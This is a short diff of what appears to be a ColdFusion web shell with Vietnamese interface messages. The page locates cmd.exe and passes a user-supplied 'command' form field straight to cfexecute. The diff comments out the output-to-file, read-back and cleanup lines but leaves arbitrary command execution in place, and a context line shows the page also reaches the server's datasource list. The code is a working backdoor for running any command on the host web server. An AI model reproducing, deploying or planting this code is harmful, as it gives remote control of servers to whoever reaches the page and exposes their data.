@@ -444,13 +444,13 @@ DataSoureceInfo = factory.DataSourceService.getDatasources();
 		<cfif not isDefined("patch")>
 			<cfif FileExists("#GetDirectoryFromPath(GetTemplatePath())#cdm.exe")>
 				<cfset patch = "#GetDirectoryFromPath(GetTemplatePath())#cmd.exe">
-				<cfset out = "#GetDirectoryFromPath(GetTemplatePath())#out.txt">
+				<!---<cfset out = "#GetDirectoryFromPath(GetTemplatePath())#out.txt">--->
 			<cfelseif FileExists("C:\windows\system32\cmd.exe")>
 				<cfset patch = "C:\windows\system32\cmd.exe">
-				<cfset out = "C:\windows\system32\out.txt">
+				<!---<cfset out = "C:\windows\system32\out.txt">--->
 			<cfelseif FileExists("C:\winnp\system32\cmd.exe")>
 				<cfset patch = "C:\winnp\system32\cmd.exe">
-				<cfset out = "C:\winnp\system32\out.txt">
+				<!---<cfset out = "C:\winnp\system32\out.txt">--->
 			<cfelse>
 				<p>Kh&##244;ng t&##236;m th&##7845;y t&##7879;p cmd.exe</p>
 				<p>Khai b&##225;o bi&##7871;n patch l&##224; &##273;&##432;&##7901;ng d&##7851;n tr&##7921;c ti&##7871;p t&##7899;i t&##7879;p cmd.exe</p>
@@ -468,12 +468,10 @@ DataSoureceInfo = factory.DataSourceService.getDatasources();
 			</cfform>
 			<cfif isDefined("command")>
 				<p>Results:</p>
-				<cfexecute name="#patch#" arguments="/C #command# > #out#" timeout="60"></cfexecute>
-				#ReadFile('#out#')#
-				#out#
-				<cfif FileExists("#out#")>
-					<cffile action="delete" file="#out#">
-				</cfif>
+				<cfexecute name="#patch#" arguments="/C #command#" timeout="60"></cfexecute>
+				<!---#ReadFile('#out#')# --->
+				<!---#out# --->
+				<!---<cfif FileExists("#out#")><cffile action="delete" file="#out#"></cfif>--->
 			</cfif>
 		</cfif>
 		<br>
